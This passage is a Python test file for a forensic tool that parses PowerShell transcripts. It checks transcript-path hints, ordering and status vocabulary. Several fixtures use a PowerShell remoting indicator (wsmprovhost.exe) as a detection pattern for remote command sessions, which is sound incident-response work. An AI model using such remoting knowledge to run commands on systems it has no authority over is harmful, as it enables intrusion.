            "wsmprovhost.exe -Embedding"

    def test_host_application_hint_uses_correct_reason(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Message": "HostApplication=wsmprovhost.exe -Embedding"},
        ]}
        hints = find_transcript_recovery_hints({"x": envelope})
        assert hints[0]["reason"] == (
            "PowerShell remoting host application reference found in "
            "tool output"
        )

    def test_no_double_emission_when_path_and_host_app_in_same_field(
        self,
    ):
        """A record with both a transcript path AND HostApplication=...
        wsmprovhost.exe in the same field must yield exactly one
        ``transcript_path_reference`` hint (with host_application set)
        -- NOT a separate host_application_reference hint."""
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [{
            "Message": (
                "HostApplication=wsmprovhost.exe -Embedding "
                "Start-Transcript -Path "
                r"C:\Users\u\Documents\PowerShell_transcript.X.Y.Z.txt"
            ),
        }]}
        hints = find_transcript_recovery_hints({"x": envelope})
        assert len(hints) == 1
        h = hints[0]
        assert h["type"] == "transcript_path_reference"
        # Host application is captured on the path hint when in the same
        # field -- no separate host_app hint is emitted.
        assert h["host_application"] is not None
        assert "wsmprovhost.exe" in h["host_application"]
        types = {x["type"] for x in hints}
        assert "transcript_host_application_reference" not in types

    def test_host_application_without_wsmprovhost_yields_no_hint(self):
        """A HostApplication value that does NOT mention wsmprovhost.exe
        (e.g., generic powershell.exe) is not flagged."""
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Message": "HostApplication=powershell.exe -Command Get-Date"},
        ]}
        hints = find_transcript_recovery_hints({"x": envelope})
        assert hints == []

    # ── ordering / determinism ─────────────────────────────────────────

    def test_deterministic_ordering(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\Users\u\B\PowerShell_transcript.B.X.Y.txt"},
            {"Name": r"\Users\u\A\PowerShell_transcript.A.X.Y.txt"},
            {"Name": r"\Users\u\C\PowerShell_transcript.C.X.Y.txt"},
        ]}
        first = find_transcript_recovery_hints({"vol_filescan": envelope})
        second = find_transcript_recovery_hints({"vol_filescan": envelope})
        assert first == second
        paths = [h["transcript_path"] for h in first]
        assert paths == sorted(paths)

    def test_tool_iteration_is_sorted(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        env = {"output": [
            {"Name": r"\u\PowerShell_transcript.A.B.C.txt"},
        ]}
        envelopes = {"z_tool": env, "a_tool": env, "m_tool": env}
        hints = find_transcript_recovery_hints(envelopes)
        tool_order = [h["source_tool"] for h in hints]
        assert tool_order == sorted(tool_order)
        assert tool_order == ["a_tool", "m_tool", "z_tool"]

    # ── closed vocabulary enforcement ──────────────────────────────────

    def test_all_emitted_hints_use_closed_type_vocab(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelopes = {
            "vol_filescan": {"output": [
                {"Name": r"\Users\u\Docs\20240101\PowerShell_transcript.X.Y.Z.txt"},
            ]},
            "parse_event_logs": {"output": [
                {"Message": "HostApplication=wsmprovhost.exe -Embedding"},
            ]},
        }
        hints = find_transcript_recovery_hints(envelopes)
        assert hints
        for h in hints:
            assert h["type"] in _EXPECTED_HINT_TYPES, h["type"]

    def test_all_emitted_hints_use_closed_status_vocab(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelopes = {
            "vol_filescan": {"output": [
                {"Name": r"\Users\u\PowerShell_transcript.X.Y.Z.txt"},
            ]},
            "parse_event_logs": {"output": [
                {"Message": "HostApplication=wsmprovhost.exe -Embedding"},
            ]},
        }
        hints = find_transcript_recovery_hints(envelopes)
        assert hints
        for h in hints:
            assert h["status"] in _EXPECTED_HINT_STATUSES, h["status"]

    def test_all_emitted_hints_carry_required_fields(self):
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelopes = {
            "vol_filescan": {"output": [
                {"Name": r"\Users\u\Docs\20240101\PowerShell_transcript.X.Y.Z.txt"},
            ]},
            "parse_event_logs": {"output": [
                {"Message": "HostApplication=wsmprovhost.exe -Embedding"},
            ]},
        }
        hints = find_transcript_recovery_hints(envelopes)
        assert len(hints) >= 2
        for h in hints:
            for field in _EXPECTED_REQUIRED_FIELDS:
                assert field in h, (
                    f"hint missing required field {field}: {h}"
                )

    # ── dataset agnostic ───────────────────────────────────────────────

    def test_dataset_agnostic_detection(self):
        """Detection works on arbitrary host/user/token names. No reliance
        on case-specific identifiers."""
        from sift_sentinel.tools.parse_powershell_transcripts import (
            find_transcript_recovery_hints,
        )
        envelope = {"output": [
            {"Name": r"\Users\zXqWvB\Docs\PowerShell_transcript.ASDF-7777.qQ_Aa1b2.20990228235959.txt"},
            {"Name": r"\opt\stuff\PowerShell_transcript.LMNOP.zZzZzZ.20180101000000.log"},
        ]}
        hints = find_transcript_recovery_hints({"vol_filescan": envelope})
        assert len(hints) == 2

    def test_no_dataset_specific_strings_in_module_source(self):
        """Production module must not embed scenario-specific tokens."""
        import sift_sentinel.tools.parse_powershell_transcripts as mod
        source = Path(mod.__file__).read_text()
        forbidden = (
            "TEST-HOST-01", "TEST_HOST_01", "sqlsvc", "tuser-r",
            "3IlbDbjb", "5cHlvR59", "ehp5JHmP", "umt1XQWc",
            "yAXjPaXf", "ykLVQpA_",
            "192.0.2.129", "192.0.2.111", "192.0.2.112",
        )
        lower = source.lower()
        for token in forbidden:
            assert token.lower() not in lower, (
                f"dataset-specific token leaked into production module: "
                f"{token}"
            )


class TestRecoveryHintsInEnvelope:
    """Integration: envelope ``status`` follows the closed 4-state vocab,
    ``recovery_hints`` is always present, and hints never synthesize fake
    parsed records."""

    # ── always-present envelope key ────────────────────────────────────

    def test_recovery_hints_key_always_present_on_missing_mount(
        self, tmp_path,
    ):
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path / "nope"),
        )
        assert "recovery_hints" in result
        assert result["recovery_hints"] == []

    def test_recovery_hints_empty_when_no_tool_outputs(self, tmp_path):
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert "recovery_hints" in result
        assert result["recovery_hints"] == []

    def test_recovery_hints_populated_when_tool_outputs_provided(
        self, tmp_path,
    ):
        envelope = {"output": [
            {"Name": r"\Users\u\Docs\20240101\PowerShell_transcript.HOSTX.AbCd.20240101120000.txt"},
        ]}
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path),
            tool_outputs={"vol_filescan": envelope},
        )
        assert result["recovery_hints"]
        h = result["recovery_hints"][0]
        assert h["source_tool"] == "vol_filescan"
        assert h["type"] == "transcript_path_reference"

    # ── closed envelope status vocab ───────────────────────────────────

    def test_status_no_transcripts_found_when_records_and_hints_empty(
        self, tmp_path,
    ):
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert result["status"] == "no_transcripts_found"
        assert result["status"] in _EXPECTED_STATUSES
        assert result["records"] == []
        assert result["recovery_hints"] == []

    def test_status_transcript_references_found_when_records_empty_and_hints_present(
        self, tmp_path,
    ):
        envelope = {"output": [
            {"Name": r"\Users\u\Docs\PowerShell_transcript.HOSTX.AbCd.20240101120000.txt"},
        ]}
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path),
            tool_outputs={"vol_filescan": envelope},
        )
        assert result["status"] == "transcript_references_found"
        assert result["status"] in _EXPECTED_STATUSES
        assert result["records"] == []
        assert result["recovery_hints"]

    def test_status_transcripts_parsed_when_records_present_and_no_hints(
        self, tmp_path,
    ):
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir)
        result = parse_powershell_transcripts(disk_mount=str(tmp_path))
        assert result["status"] == "transcripts_parsed"
        assert result["status"] in _EXPECTED_STATUSES
        assert result["records"]
        assert result["recovery_hints"] == []

    def test_status_transcripts_parsed_with_references_when_both_present(
        self, tmp_path,
    ):
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir)
        envelope = {"output": [
            {"Name": r"\Users\u\Docs\PowerShell_transcript.HOSTX.AbCd.20240101120000.txt"},
        ]}
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path),
            tool_outputs={"vol_filescan": envelope},
        )
        assert result["status"] == "transcripts_parsed_with_references"
        assert result["status"] in _EXPECTED_STATUSES
        assert result["records"]
        assert result["recovery_hints"]

    def test_envelope_status_uses_closed_vocab_across_all_branches(
        self, tmp_path,
    ):
        """Every code path through the parser must emit a status from the
        closed vocab -- no ad hoc strings."""
        envelope = {"output": [
            {"Name": r"\Users\u\PowerShell_transcript.A.B.C.txt"},
        ]}
        for kwargs in (
            {"disk_mount": str(tmp_path / "nope")},
            {"disk_mount": str(tmp_path / "nope"),
             "tool_outputs": {"vol_filescan": envelope}},
            {"disk_mount": str(tmp_path)},
            {"disk_mount": str(tmp_path),
             "tool_outputs": {"vol_filescan": envelope}},
        ):
            result = parse_powershell_transcripts(**kwargs)
            assert result["status"] in _EXPECTED_STATUSES, (
                f"status {result['status']!r} not in closed vocab "
                f"for kwargs={kwargs}"
            )

    def test_missing_mount_with_hints_emits_transcript_references_found(
        self, tmp_path,
    ):
        envelope = {"output": [
            {"Name": r"\Users\u\PowerShell_transcript.X.Y.Z.txt"},
        ]}
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path / "does-not-exist"),
            tool_outputs={"vol_filescan": envelope},
        )
        assert result["status"] == "transcript_references_found"
        assert result["recovery_hints"]
        assert result["records"] == []

    # ── no fake records from hints ─────────────────────────────────────

    def test_no_fake_records_when_only_hints_exist(self, tmp_path):
        """recovery_hints must NOT be merged into records[]/output[].
        Hints are pointers, not parsed transcript content."""
        envelope = {"output": [
            {"Name": r"\Users\u\Docs\PowerShell_transcript.HOSTX.AbCd.20240101120000.txt"},
            {"Message": "HostApplication=wsmprovhost.exe -Embedding"},
        ]}
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path),
            tool_outputs={"vol_filescan": envelope,
                          "parse_event_logs": envelope},
        )
        assert result["records"] == []
        assert result["output"] == []
        assert result["record_count"] == 0
        # And there are real hints to prove the test exercised the path
        assert result["recovery_hints"]

    def test_records_unaffected_when_hints_present(self, tmp_path):
        """Records parsed from disk are independent of hints."""
        user_dir = _make_user_dir(tmp_path)
        _make_transcript_file(user_dir)
        baseline = parse_powershell_transcripts(disk_mount=str(tmp_path))
        envelope = {"output": [
            {"Name": r"\Users\u\PowerShell_transcript.X.Y.Z.txt"},
        ]}
        with_hints = parse_powershell_transcripts(
            disk_mount=str(tmp_path),
            tool_outputs={"vol_filescan": envelope},
        )
        assert baseline["records"] == with_hints["records"]
        assert with_hints["recovery_hints"]

    # ── signature / API ────────────────────────────────────────────────

    def test_signature_still_callable_with_no_args(self):
        import inspect
        sig = inspect.signature(parse_powershell_transcripts)
        params = sig.parameters
        assert "tool_outputs" in params
        assert params["tool_outputs"].default is None
        assert all(
            p.default is not inspect.Parameter.empty
            or p.kind in (
                inspect.Parameter.VAR_POSITIONAL,
                inspect.Parameter.VAR_KEYWORD,
            )
            for p in params.values()
        )

    def test_invalid_tool_outputs_treated_as_no_hints(self, tmp_path):
        result = parse_powershell_transcripts(
            disk_mount=str(tmp_path),
            tool_outputs="not-a-dict",  # type: ignore[arg-type]
        )
        assert result["recovery_hints"] == []
        assert result["status"] in _EXPECTED_STATUSES
